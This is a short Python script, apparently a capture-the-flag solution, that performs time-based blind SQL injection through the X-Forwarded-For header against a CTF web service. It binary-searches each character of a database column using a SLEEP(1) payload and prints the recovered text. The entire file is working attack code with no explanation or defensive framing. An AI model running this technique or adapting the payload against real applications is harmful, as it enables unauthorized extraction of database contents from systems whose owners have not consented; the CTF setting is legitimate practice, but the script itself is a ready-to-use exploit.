import requests
import time
database='ctf'
table='sqltimelog1'
col='id,ip,time,description'
url="http://web1.0ops.sjtu.cn:40007/time1/index.php"
ans=''
index=1
while True:
    l=0
    r=255
    while l!=r:
        mid=((l+r)>>1)
        payload=f"'or IF(ASCII(MID((select group_concat(description) from (select * from sqltimelog1 where id<10) AS t),{index},1))>{mid},SLEEP(1),1) or '"
        headers = {'X-Forwarded-For': payload}
        beg=time.time()
        response=requests.get(url, headers=headers)
        ed=time.time()
        if ed-beg>=0.5:
            l=mid+1
        else:
            r=mid
    ans+=chr(l)
    print(ans)
    index+=1
